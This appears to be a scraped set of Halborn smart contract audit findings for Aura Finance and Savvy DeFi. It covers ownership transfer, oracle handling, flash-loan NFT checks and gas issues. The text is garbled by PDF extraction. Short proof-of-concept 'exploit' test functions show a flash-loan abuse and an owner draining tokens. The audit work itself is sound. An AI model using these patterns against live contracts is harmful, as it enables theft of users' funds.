contract, if a not valid account was assigned as a owner, administrative functions such as recovering LP rewards from other systems or shutting down the contract will not be possible. This issue also applies to other types of privilege transfer methods, like the setAdmin function in the AuraVestedEscrow contract: Listing 2: AuraVestedEscrow.sol (Line 206) 79 80 81 82 function setAdmin ( address _admin ) external { require ( msg . sender == admin , \"! auth \"); admin = _admin ; } 14 Affected Contracts: - aura-contracts/AuraClaimZap.sol - aura-contracts/AuraLocker.sol - aura-contracts/AuraPenaltyForwarder.sol - aura-contracts/ExtraRewardsDistributor.sol - aura-contracts/AuraVestedEscrow.sol - convex-platform/Booster.sol - convex-platform/ConvexMasterChef.sol Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to implement a two-step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of the ownership to fully succeed. This ensures the nominated account is a valid and active account. Remediation Plan: RISK ACCEPTED: The Aura Finance team accepted the risk of this finding and does not plan to correct it in the future in order to keep the difference between Aura and Convex as minimal as possible to aid in manual reviews and minimize the chance of introducing bugs. 15 ", "labels": ["Halborn", "Aura_Finance", "Severity: Low"]}, {"title": "DUPLICATE ENTRY IN THE VESTING DISTRIBUTION LIST", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aura_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "0xcc6548f1b572968f9539d604ec9ff4b933c1be74 address accidentally appeared twice in the AURA vesting distribution list (tasks/deploy/mainnet-config .ts). Listing 3: tasks/deploy/mainnet-config.ts 170 // 24 MONTHS - 8.45% 171 { 172 173 174 period : ONE_WEEK . mul (104) , recipients : [ { address : \" 0 xe3B6c287C1369C6A4fa8d4e857813695C52948EF \" ,  amount : simpleToExactAmount (0.275 , 24) }, // Core team 175 { address : \" 0 x023320e0C9Ac45644c3305cE574360E901c7f582 \" ,  amount : simpleToExactAmount (0.5 , 24) }, // Core team 176 { address : \" 0 xB1f881f47baB744E7283851bC090bAA626df931d \" ,  amount : simpleToExactAmount (3.5 , 24) }, // Core team 177 { address : \" 0 xE4b32828B558F17BcaF5efD52f0C067dba38833c \" ,  amount : simpleToExactAmount (0.45 , 24) }, // Core team 178 { address : \" 0 xcc6548f1b572968f9539d604ec9ff4b933c1be74 \" ,  amount : simpleToExactAmount (0.075 , 24) }, // Core team 179 { address : \" 0 x51d63958a63a31eb4028917f049ce477c8dd07bb \" ,  amount : simpleToExactAmount (0.5 , 24) }, // Core team 180 { address : \" 0 x3078c3b436511152d86675f9cbfd89ec1672f804 \" ,  amount : simpleToExactAmount (0.3 , 24) }, // Core team 181 { address : \" 0 x3000d9b2c0e6b9f97f30abe379eaaa8a85a04afc \" ,  amount : simpleToExactAmount (0.325 , 24) }, // Core team 182 { address : \" 0 x3CBFFF3E75881c1619eaa82DC724BDEE6fF6ED19 \" ,  amount : simpleToExactAmount (0.06 , 24) }, // Core team 183 { address : \" 0 xaf3824e8401299B25C4D59a8a035Cf9312a3B454 \" ,  amount : simpleToExactAmount (0.175 , 24) }, // Core team 184 { address : \" 0 x738175DB2C999581f29163e6D4D3516Ad4aF8834 \" ,  amount : simpleToExactAmount (0.125 , 24) }, // Core team 185 { address : \" 0 x0d9A5678E73e5BbC0ee09FAF8e550B196c76fDad \" ,  amount : simpleToExactAmount (0.5 , 24) }, // Core team 186 { address : \" 0 x285b7EEa81a5B66B62e7276a24c1e0F83F7409c1 \" ,  amount : simpleToExactAmount (1.5 , 24) }, // Core team 16 187 { address : \" 0 xbee5a45271cc66a5b0e9dc4164a4f9df196d94fa \" ,  amount : simpleToExactAmount (0.125 , 24) }, // Core team 188 { address : \" 0 xcc6548f1b572968f9539d604ec9ff4b933c1be74 \" ,  amount : simpleToExactAmount (0.04 , 24) }, // Core team 189 190 }, ], Aura Finance used this list to fund recipients with AURA reward tokens: Listing 4: scripts/deploySystem.ts 700 const vestingAddr = vestingGroup . recipients . map ( m => m .  address ); 701 const vestingAmounts = vestingGroup . recipients . map ( m => m .  amount ); 702 tx = await vestedEscrow . fund ( vestingAddr , vestingAmounts ); Risk Level: Likelihood - 3 Impact - 1 Recommendation: It is recommended reviewing the configuration data used to fund the vesting recipients and, if necessary, correcting the values using the vesting admin. Remediation Plan: RISK ACCEPTED: The Aura Finance team will correct this finding through the governance. 17 ", "labels": ["Halborn", "Aura_Finance", "Severity: Low"]}, {"title": "MISTAKENLY SENT ERC20 TOKENS CAN NOT RESCUED IN THE CONTRACTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aura_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contracts are missing functions to sweep/rescue accidental ERC-20 Accidentally, sent ERC-20 tokens will be locked in the transfers. contracts. Recommendation: Consider adding a function to sweep accidental ERC-20 transfers to the contracts. Remediation Plan: ACKNOWLEDGED: The Aura Finance team acknowledged this finding and does not plan to fix it in the future to keep the difference between Aura and Convex as minimal as possible to aid in the manual reviews and minimize the chance of introducing bugs. 18 ", "labels": ["Halborn", "Aura_Finance", "Severity: Informational"]}, {"title": "USING POSTFIX OPERATORS IN LOOPS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aura_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the loops below, postfix (e.g. i++) operators were used to increment or decrement variable values. It is known that, in loops, using prefix operators (e.g. ++i) costs less gas per iteration than using postfix operators. Code Location: aura-contracts/AuraClaimZap.sol - Line 134 for (uint256 i = 0; i < rewardContracts.length; i++){ - Line 138 for (uint256 i = 0; i < extraRewardContracts.length; i++){ - Line 142 for (uint256 i = 0; i < tokenRewardContracts.length; i++){ aura-contracts/AuraLocker.sol - Line 176 for (uint256 i = 0; i < rewardTokensLength; i++){ - Line 332 for (uint256 i; i < rewardTokensLength; i++){ - Line 350 for (uint256 i; i < rewardTokensLength; i++){ - Line 450 for (uint256 i = nextUnlockIndex; i < length; i++){ - Line 466 nextUnlockIndex++; - Line 537 i--;; aura-contracts/AuraVestedEscrow.sol - Line 105 for (uint256 i = 0; i < _recipient.length; i++){ aura-contracts/BalLiquidityProvider.sol - Line 52 for (uint256 i = 0; i < 2; i++){ aura-contracts/ExtraRewardsDistributor.sol - Line 242 for (uint256 i = epochIndex; i < tokenEpochs; i++){ convex-platform/ArbitartorVault.sol - Line 49 for(uint256 i = 0; i < _toPids.length; i++){ 19 convex-platform/BaseRewardPool.sol - Line 218 for(uint i=0; i < extraRewards.length; i++){ - Line 234 for(uint i=0; i < extraRewards.length; i++){ - Line 266 for(uint i=0; i < extraRewards.length; i++){ - Line 300 for(uint i=0; i < extraRewards.length; i++){ convex-platform/Booster.sol - Line 380 for(uint i=0; i < poolInfo.length; i++){ - Line 539 for(uint256 i = 0; i < _gauge.length; i++){ convex-platform/BoosterOwner.sol - Line 144 for(uint256 i = 0; i < poolCount; i++){ convex-platform/ExtraRewardStashV3.sol - Line 125 for(uint256 i = 0; i < maxRewards; i++){ - Line 201 for(uint i=0; i < tCount; i++){ convex-platform/PoolManagerSecondaryProxy.sol - Line 69 for(uint i=0; i < usedList.length; i++){ It is also possible to further optimize loops by using unchecked loop index incrementing and decrementing. 20 Proof of Concept: For example, based on the following test contract: Listing 5: GasTestIncrement.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.11; 3 4 contract GasTestIncrement { 5 6 7 8 9 10 11 12 13 14 15 16 17 18 } unchecked { ++ i; } } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } } function uncheckedpreiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ;) { We can see the difference in gas costs: 21 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use unchecked ++i and --j operations instead of i++ and j-- to increment or decrement the values of a uint variables inside loops. This does not just apply to the iterator variables, but the increments and decrements done inside the loops code blocks too. It is noted that using unchecked operations requires particular caution to avoid overflows. Remediation Plan: ACKNOWLEDGED: The Aura Finance team acknowledged this finding and does not plan to correct it in the future in order to keep the difference between Aura and Convex as minimal as possible to aid in manual reviews and minimize the chance of introducing bugs. 22 ", "labels": ["Halborn", "Aura_Finance", "Severity: Informational"]}, {"title": "ARRAY.LENGTH USED IN LOOP CONDITIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aura_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the loops below, unnecessary reading of the lengths of arrays on each iteration wastes gas. Code Location: aura-contracts/AuraClaimZap.sol - Line 134 for (uint256 i = 0; i < rewardContracts.length; i++){ - Line 138 for (uint256 i = 0; i < extraRewardContracts.length; i++){ - Line 142 for (uint256 i = 0; i < tokenRewardContracts.length; i++){ aura-contracts/AuraVestedEscrow.sol - Line 105 for (uint256 i = 0; i < _recipient.length; i++){ convex-platform/ArbitartorVault.sol - Line 49 for(uint256 i = 0; i < _toPids.length; i++){ convex-platform/BaseRewardPool.sol - Line 218 for(uint i=0; i < extraRewards.length; i++){ - Line 234 for(uint i=0; i < extraRewards.length; i++){ - Line 266 for(uint i=0; i < extraRewards.length; i++){ - Line 300 for(uint i=0; i < extraRewards.length; i++){ convex-platform/Booster.sol - Line 380 for(uint i=0; i < poolInfo.length; i++){ - Line 539 for(uint256 i = 0; i < _gauge.length; i++){ convex-platform/PoolManagerSecondaryProxy.sol - Line 69 for(uint i=0; i < usedList.length; i++){ 23 Proof of Concept: For example, based on the following test contract: Listing 6: GasTestLength.sol uint256 [] private arr = [0 ,1 ,2 ,3 ,4 ,5 ,6 ,7 ,8 ,9]; function unoptimalized () public { for ( uint256 i = 0; i < arr . length ; ++ i) { } 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.11; 3 4 contract GasTestLength { 5 6 7 8 9 10 11 12 13 14 15 16 17 18 } } } function optimalized () public { uint256 length = arr . length ; for ( uint256 i = 0; i < length ; ++ i ) { } We can see the difference in gas costs: Risk Level: Likelihood - 1 Impact - 1 24 Recommendation: It is recommended to cache array lengths outside of loops as long the size is not changed during the loop: Listing 7 1 uint256 length = arr . length ; 2 for ( uint256 i = 0; i < length ; ++ i ) { 3 4 } ... Remediation Plan: ACKNOWLEDGED: The Aura Finance team acknowledged this finding and does not plan to correct it in the future in order to keep the difference between Aura and Convex as minimal as possible to aid in manual reviews and minimize the chance of introducing bugs. 25 ", "labels": ["Halborn", "Aura_Finance", "Severity: Informational"]}, {"title": "USING != 0 CONSUMES LESS GAS THAN > 0 IN UNSIGNED INTEGER VALIDATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aura_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the require statements below, > 0 was used to validate if the unsigned integer parameters are bigger than 0. It is known that, using != 0 costs less gas than > 0. Code Location: aura-contracts/AuraBalRewardPool.sol - Line 121 require(_amount > 0, \"RewardPool : Cannot stake 0\"); - Line 139 require(_amount > 0, \"RewardPool : Cannot stake 0\"); - Line 157 require(amount > 0, \"RewardPool : Cannot withdraw 0\"); - Line 232 require(rewardsAvailable > 0, \"!balance\"); aura-contracts/AuraLocker.sol - Line 236 require(rewardData[_rewardsToken].lastUpdateTime > 0, ... - Line 285 require(_amount > 0, \"Cannot stake 0\"); - Line 399 require(amt > 0, \"Nothing locked\"); - Line 425 require(length > 0, \"no locks\"); - Line 471 require(locked > 0, \"no exp locks\"); - Line 511 require(len > 0, \"Nothing to delegate\"); - Line 862 require(_rewards > 0, \"No reward\"); aura-contracts/AuraMerkleDrop.sol - Line 139 require(_amount > 0, \"!amount\"); aura-contracts/AuraPenaltyForwarder.sol - Line 55 require(bal > 0, \"!empty\"); aura-contracts/AuraVestedEscrow.sol - Line 55 require(totalLocked[_recipient] > 0, \"!funding\"); 26 aura-contracts/BalLiquidityProvider.sol - Line 74 require(balAfter > 0, \"!mint\"); aura-contracts/ExtraRewardsDistributor.sol - Line 104 require(_amount > 0, \"!amount\"); - Line 180 require(_index > 0 && ...); aura-contracts/RewardPoolDepositWrapper.sol - Line 51 require(minted > 0, !mint); convex-platform/BaseRewardPool.sol - Line 215 require(_amount > 0, 'RewardPool : Cannot stake 0'); - Line 231 require(amount > 0, 'RewardPool : Cannot withdraw 0'); convex-platform/ConvexMasterChef.sol - Line 138 require(totalAllocPoint > 0, \"!alloc\"); convex-platform/CrvDepositor.sol - Line 169 require(_amount > 0,\"!>0\"); convex-platform/PoolManagerSecondaryProxy.sol - Line 104 require(weight > 0, \"must have weight\"); convex-platform/interfaces/BoringMath.sol - Line 20 require(b > 0, \"BoringMath: division by zero\"); - Line 102 require(b > 0, \"BoringMath: division by zero\"); - Line 123 require(b > 0, \"BoringMath: division by zero\"); - Line 143 require(b > 0, \"BoringMath: division by zero\"); 27 Proof of Concept: For example, based on the following test contract: Listing 8: GasTestRequire.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.11; 3 4 contract GasTestRequire { 5 6 7 8 9 10 11 } } function originalrequire ( uint256 len ) public { require ( len > 0, \" Error ! \"); } function optimalizedrequire ( uint256 len ) public { require ( len != 0 , \" Error !\" ); We can see the difference in gas costs: Risk Level: Likelihood - 1 Impact - 1 28 Recommendation: It is recommended to use != 0 instead of > 0 to validate unsigned integer parameters. For example, use instead: Listing 9 1 require ( _amount != 0 , \" RewardPool : Cannot stake 0\") ; Remediation Plan: ACKNOWLEDGED: The Aura Finance team acknowledged this finding and does not plan to correct it in the future to keep the difference between Aura and Convex as minimal as possible to aid in manual reviews and minimize the chance of introducing bugs. 29 ", "labels": ["Halborn", "Aura_Finance", "Severity: Informational"]}, {"title": "DEBT CAN BE REPAID WITH UNDERLYING TOKEN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf", "body": "When an underlyingToken is used as collateral, the amount in terms of the underlyingToken (adjusted for decimals) will always be taken in a 1:1 ratio/price into _totalValue. We believe this design is flawed and can cause systemic failure when one of the underlyingTokens is severely depegged. Because when the underlyingToken is depegged, and the svyToken minted is worth more than the collateral underlyingToken in the market. The arbitrageur can simply mint and dump svyToken as much as they can and choose to abandon the collateral. Code Location: Listing 1: contracts/SavvyPositionManager.sol 1029 function _totalValue ( address owner ) internal view returns (  uint256 ) { 1030 1031 1032 uint256 totalValue = 0; Sets . AddressSet storage depositedTokens = _accounts [ owner  ]. depositedTokens ; 1033 for ( uint256 i = 0; i < depositedTokens . values . length ; i  ++) { 1034 1035  ]; 1036 1037 1038 1039 address yieldToken = depositedTokens . values [ i ]; uint256 shares = _accounts [ owner ]. balances [ yieldToken ( address baseToken_ , uint256 amountBaseTokens ) = _yieldStrategyManager . convertSharesToBaseTokens (  yieldToken , shares ); 1040 1041 totalValue += _normalizeBaseTokensToDebt ( baseToken_ ,  amountBaseTokens ); } 1042 1043 1044 return totalValue ; 24 1045 } Scenario:  One collateral token used by Savvy experiences a severe de-pegging against other collaterals. For this example, we will assume DAI drops to 80 cents vs. USDC & USDT. svyUSD maintains its peg against USDC & USDT.  Users can buy DAI off the market, deposit it into Savvy, take a loan, and repeat this loop until the minting cap is reached. Users can buy DAI off the market and use it to repay their loans until the repay cap is reached.  Users can liquidate their current yDAI position (paying off their outstanding debt discounted), buy more DAI with their loan, deposit it into Savvy, take a loan, and repeat until the liquidation cap is reached. These arbitrage opportunities will likely result in one or more of the mint / repay / liquidate caps being met. Risk Level: Likelihood - 3 Impact - 4 Recommendation: Consider using an oracle to query the market price of the underlyingTokens , and calculate the _totalValue based on the market price. Remediation Plan: RISK ACCEPTED: The Savvy team accepted the risk of this issue. 25 ", "labels": ["Halborn", "Savvy_DeFi_Securtity", "Severity: Medium"]}, {"title": "INCOMPATIBILITY WITH DEFLATIONARY TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf", "body": "We have discovered that the system is incompatible with deflationary tokens. These are tokens that are designed to reduce in supply over time, often through a process called burning, which permanently removes tokens from circulation. The protocol relies on accurate token balances to function properly, and the changing supply of deflationary tokens causes issues with this. Specifically, we have noticed that transactions involving deflationary tokens are not being recorded correctly, leading to incorrect balances and potentially causing problems for our users. Code Location: Listing 2: contracts/SavvyLGE.sol 289 290 291 292 293 294 295 function _buy ( uint256 deposited , address nftCollectionAddress , uint256 nftId , uint256 vestModeIndex ) internal { uint256 allotmentsPerDepositToken =  _getAllotmentsPerDepositToken ( nftCollectionAddress , vestModeIndex )  ; 296  ; 297 298 299 uint256 allotments = deposited * allotmentsPerDepositToken if ( nftCollectionAddress != address (0) ) { NFTAllocationInfo storage nftAllocationInfo =  nftAllocationInfos [ nftCollectionAddress ][ nftId ]; 300 301 302 303 if (! nftAllocationInfo . activated ) { _activate ( nftCollectionAddress , nftId , deposited ); } else { Checker . checkState ( nftAllocationInfo . remaining >= 26  deposited , \" insufficient availability for nft \" ); 304 305 306 307 308 309 310 311 312 313 } nftAllocationInfo . remaining -= deposited ; } } _updateUserBuyInfo ( deposited , allotments , vestModeIndex ); allotmentSupply += allotments ; totalDeposited += deposited ; emit AllotmentsBought ( msg . sender , deposited , allotments ); Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is mandatory to have this dynamic in mind when on-boarding new tokens to be able to track the token balances correctly. Remediation Plan: SOLVED: The Savvy team solved this issue by adding pre- / post-balance check. Commit ID: 10cd1d78ab55b20e143323bdf7f0f7080fc48a8f 27 ", "labels": ["Halborn", "Savvy_DeFi_Securtity", "Severity: Medium"]}, {"title": "CHAINLINK ORACLE RETURN VALUES ARE NOT HANDLED PROPERTY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf", "body": "Chainlink oracle return values are not handled properly, the priceFeed will return the following variables: - roundId - answer - startedAt - updatedAt - answeredInRound These return values are meant to be used to do some extra checks before updating the price. By just receiving the price, you can get stale prices and incomplete rounds. Code Location: 28 Listing 3: contracts/SavvyPriceFeed.sol function _getChainlinkTokenPrice ( address priceFeed_ ) internal view returns ( uint256 ) { AggregatorV3Interface priceFeed = AggregatorV3Interface ( 65 66 67 68 69  priceFeed_ ); 70 71 72 73 74 75 76 77 78 79 } } (, int price , , ,) = priceFeed . latestRoundData () ; uint256 tokenPrice = 0; if ( price > 0) { tokenPrice = SafeCast . toUint256 ( price ); uint8 decimals = priceFeed . decimals () ; uint8 additionDecimals = 18 - decimals ; return tokenPrice * 10** additionDecimals ; Scenario: _getChainlinkTokenPrice calls out to a Chainlink oracle receiving the latestRoundData(). If there is a problem with Chainlink starting a new round and finding consensus on the new value for the oracle (e.g. Chainlink nodes abandon the oracle, chain congestion, vulnerability/attacks on the chainlink system) consumers of this contract may continue using outdated stale or incorrect data (if oracles are unable to submit no new round is started). Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to use this code to get all the values and sanitize the input. 29 Listing 4: contracts/SavvyPriceFeed.sol ( uint80 roundID , answer ,, uint256 timestamp , uint80 65  answeredInRound ) = AggregatorV3Interface ( chainLinkAggregatorMap [  underlying ]) . latestRoundData () ; 66 67 require ( answer > 0, \"\" Chainlink price <= 0 \" \"); 68 require ( answeredInRound >= roundID , \" \" Stale price \"\" ); 69 require ( timestamp != 0 , \" \" Round not complete \" \" ); \" Remediation Plan: SOLVED: The Savvy team solved this issue. checks to check for stale prices and incomplete rounds. They added the recommended Commit ID: 08ae4cde0e606121cbdbca9831c9cb430cfe3155 30 ", "labels": ["Halborn", "Savvy_DeFi_Securtity", "Severity: Medium"]}, {"title": "CHAINLINK ORACLE CAN CRASH WITH DECIMALS LONGER THAN 18", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf", "body": "If the priceFeed from chainlink returns 18 decimals or more, it will make the function crash or fail the calculation as the code is multiplying the token price by 18 minus the number of decimals of the priceFeed. Code Location: Listing 5: contracts/SavvyPriceFeed.sol function _getChainlinkTokenPrice ( address priceFeed_ ) internal view returns ( uint256 ) { AggregatorV3Interface priceFeed = AggregatorV3Interface ( ( 65 66 67 68  priceFeed_ ); 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 } uint80 roundID , int price ,, uint256 timestamp , uint80 answeredInRound ) = priceFeed . latestRoundData () ; require ( price > 0, \" Chainlink price <= 0 \" ); require ( answeredInRound >= roundID , \" Stale price \" ); require ( timestamp != 0 , \" Round not complete \"); uint256 tokenPrice = uint256 ( price ); uint8 decimals = priceFeed . decimals () ; uint8 additionDecimals = 18 - decimals ; return tokenPrice * 10** additionDecimals ; 31 Proof Of Concept: _getChainlinkTokenPrice gets the latest round information at that point, if the price feed returns a number of decimals >= 18 they will be set to 0. That will make the transaction revert or return a 0 - token price. Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is mandatory to not use any token with more than 18 decimals to avoid breaking the feed. Remediation Plan: SOLVED: The Savvy team solved this issue by adding the decimal check. Commit ID: 08ae4cde0e606121cbdbca9831c9cb430cfe3155 32 ", "labels": ["Halborn", "Savvy_DeFi_Securtity", "Severity: Medium"]}, {"title": "VERIFICATION OF NFT OWNER AND FLASH LOANS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf", "body": "Suppose that the NFT is borrowed (via a flash loan), then there is temporary access to the NFT and the user can interact with the buy function. If an attacker discovers a NFT that has not claimed all the tokens that they can, he will be able to do a flashloan then call the buy function, getting the tokens and then returning the NFT. Code Location: Listing 6: contracts/SavvyLGE.sol 202 203 204 205 206 207 208 function buy ( uint256 amount , address nftCollectionAddress , uint256 nftId , uint256 vestModeIndex ) public override whenNotPaused lgeNotEnded nonReentrant { Checker . checkState ( block . timestamp >= lgeStartTimestamp , \"  lge has not begun \" ); 209 210 Checker . checkArgument ( amount != 0 , \" amount is invalid \" ); Checker . checkArgument ( vestModeIndex < vestModes . length , \"  invalid vest mode index \"); 211 212 if ( nftCollectionAddress != address (0) ) { Checker . checkArgument ( nftCollectionInfos [  nftCollectionAddress ]. limit != 0 , \" this NFT is not eligible for  boost \" ); 213 Checker . checkArgument ( IERC721 ( nftCollectionAddress ).  ownerOf ( nftId ) == msg . sender , \" buyer is not the owner of this NFT \"  ); 214 215 } amount = TokenUtils . safeTransferFrom ( address ( depositToken )  , msg . sender , depositTokenWallet , amount ); _buy ( amount , nftCollectionAddress , nftId , vestModeIndex ); 216 217 218 } 33 Proof Of Concept: Listing 7: contracts/SavvyLGE.sol 289 function exploit ( address _nftAddress , uint256 _nftId , uint256  _vestMode ) { 290 291 292 293 294 295 296 297 298 299 // Get fake flashloan uint256 flashloanAmount = 10; vm . deal ( attacker , flashLoanAmount ); savvyLGE . buy (10 , _nftAddress , _nftId , _vestMode ); // sell tokens // Return fake flashloan vm . deal ( attacker , ( payable )( address . this ). balance -  flashLoanAmount ); 300 } Risk Level: Likelihood - 3 Impact - 3 Recommendation: Keep in mind that this can be abused if you create any new functionality that could be profitable for the exploiter. Remediation Plan: RISK ACCEPTED: The Savvy team accepted the risk of this issue. 34 ", "labels": ["Halborn", "Savvy_DeFi_Securtity", "Severity: Medium"]}, {"title": "OWNER CAN EXTRACT ALL WRAPPED TOKEN FROM WRAPTOKENGATEWAY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf", "body": "The owner of the WrapTokenGateway contract can extract all existing WrapToken from the contract via the refreshAllowance method. These capabilities must be limited in favor of decentralization, in order to avoid loss of reputation or user confidence. Code Location: Listing 8: contracts/WrapTokenGateway.sol function refreshAllowance ( address savvy ) external onlyOwner { require ( ISavvyPositionManager ( savvy ). supportInterface ( 53 54  type ( ISavvyAdminActions ). interfaceId ) , \" not SavvyPositionManager  address \" ); 55 56 WAVAX . approve ( savvy , type ( uint256 ). max ); } Proof Of Concept: Listing 9: contracts/SavvyLGE.sol 289 290 291 292 function exploit ( address attackerAddress ) { vm . prank ( owner ); wrapTokenGateway . refreshAllowance ( attacker ); WAVAX . withdraw ( WAVAX . balanceOf ( addressWrapTokenGateway () ))  ; 293 } 35 Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended a multisignature wallet / governance wallet or any other method to make sure that the owners address does not get compromised. Remediation Plan: SOLVED: The Savvy team solved this issue. They changed the refreshAl- lowance logic to and added a removeAllowance method that can help when changing the signer. Commit ID: 10cd1d78ab55b20e143323bdf7f0f7080fc48a8f 36 ", "labels": ["Halborn", "Savvy_DeFi_Securtity", "Severity: Low"]}, {"title": "FLASHMINT FEE IS NOT ADJUSTED ACCORDING TO BPS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf", "body": "The setFlashFee does not use the BPS constant when setting the newFee, this will lead to miss calculating every number that depends on flashMintFee after setFlashFee it is called. Code Location: Listing 10: contracts/SavvySyntheticToken.sol 100 101 102 103 104 function setFlashFee ( uint256 newFee ) public onlyAdmin { Checker . checkArgument ( newFee <= BPS , \" invalid fee \" ); flashMintFee = newFee ; emit SetFlashMintFee ( flashMintFee ); } Proof Of Concept: Listing 11: contracts/SavvyLGE.sol 289 290 291 292 293 294 function exploit () { uint256 newFee = 10; uint256 BPS = 10000; vm . prank ( admin ); savvySyntheticToken . setFlashFee (10) ; // Here I compare the result with the BPS and the number  that we get in the contract 295 296 } vm . assertEq ( savvySyntheticToken . flashMintFee , newFee / BPS ); 37 Risk Level: Likelihood - 2 Impact - 5 Recommendation: It is a must to add the BPS to the calculation of the fee in order to have the calculations working. Listing 12: contracts/SavvySyntheticToken.sol 100 101 102 103 104 function setFlashFee ( uint256 newFee ) public onlyAdmin { Checker . checkArgument ( newFee <= BPS , \" invalid fee \" ); flashMintFee = newFee / BPS ; emit SetFlashMintFee ( flashMintFee ); } Remediation Plan: SOLVED: The Savvy team solved this issue. They added the BPS rate to the calculation, making the result correct. Commit ID: 10cd1d78ab55b20e143323bdf7f0f7080fc48a8f 38 ", "labels": ["Halborn", "Savvy_DeFi_Securtity", "Severity: Medium"]}, {"title": "DECREASE REPAY WITH BASE TOKEN LIMITER NOT USED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf", "body": "During the code review, It has been noticed that decreaseRepayWithBaseTokenLimiter function is not used. On the other hand, the limiter is decreased after limit check on the repayWithBaseToken function. Furthermore, in the repayWithCollateral token does not decrease limiter. Code Location: Listing 13: contracts/YieldStrategyManager.sol 401 402 403 404 405 function repayWithBaseToken ( address baseToken , uint256 amount , int256 debt ) external onlySavvyPositionManager returns ( uint256 , uint256 )  { 406  repaid . // Determine the maximum amount of base tokens that can be 407 408 // // It is implied that this value is greater than zero  because ` debt ` is greater than zero so a noop is not possible // beyond this point . Casting the debt to an unsigned 409  integer is also safe because `debt ` is greater than zero . 410 uint256 maximumAmount = _normalizeDebtTokensToUnderlying (  baseToken , uint256 ( debt )) ; 411 412 // Limit the number of base tokens to repay up to the  maximum allowed . 413 uint256 actualAmount = amount > maximumAmount ?  maximumAmount : amount ; 414 415 // Check to make sure that the base token repay limit has  not been breached . 39 416 uint256 _currentRepayWithBaseTokenLimit = _repayLimiters [  baseToken ]. get () ; 417 418 if ( actualAmount > _currentRepayWithBaseTokenLimit ) { revert RepayLimitExceeded ( baseToken , actualAmount ,  _currentRepayWithBaseTokenLimit ); 419 420 421 } uint256 credit = _normalizeBaseTokensToDebt ( baseToken ,  actualAmount ); 422 423 // Decrease the amount of the base token which is  globally available to be repaid . 424 425 426 427 } _repayLimiters [ baseToken ]. decrease ( actualAmount ); return ( credit , actualAmount ); Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to delete the function or call it from repayWithBaseToken and repayWithCollateral instead of decreasing it there. Remediation Plan: SOLVED: The Savvy team solved this issue. They changed the code to call decreaseRepayWithBaseTokenLimiter from the functions instead of writing the logic inside. Commit ID: 10cd1d78ab55b20e143323bdf7f0f7080fc48a8f 40 ", "labels": ["Halborn", "Savvy_DeFi_Securtity", "Severity: Medium"]}, {"title": "ALLOWLISTING ALLOWS ADMINS TO BLOCK WITHDRAWALS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf", "body": "Allowlisting allows admins to block withdrawals. After some time of operation, the admins turn off allowlisting, allowing full integration by any smart contract. A small DeFi platform started integrating with SavvyDefi. Users using contract-based wallets and solutions like Gnosis Safe start using SavvyDefi. Then, due to a perceived risk, the SavvyDefi admins turn the allowlist back on. The small platform and the end users are now blocked from withdrawing funds, or interacting at all with the contracts in any way, and are at the mercy of the admins. Code Location: Listing 14: contracts/SavvyPositionManager.sol 1164 1165 1166 1167 1168 1169 1170 1171 function _withdrawYieldToken ( address owner , address yieldToken , uint256 shares , address recipient ) internal returns ( uint256 ) { _onlyAllowlisted () ; Checker . checkArgument ( recipient != address (0) , \" zero  recipient address \" ); 1172  ; 1173 1174 _yieldStrategyManager . checkSupportedYieldToken ( yieldToken ) uint256 amountYieldTokens = _withdraw ( yieldToken , owner ,  shares , recipient ); 1175 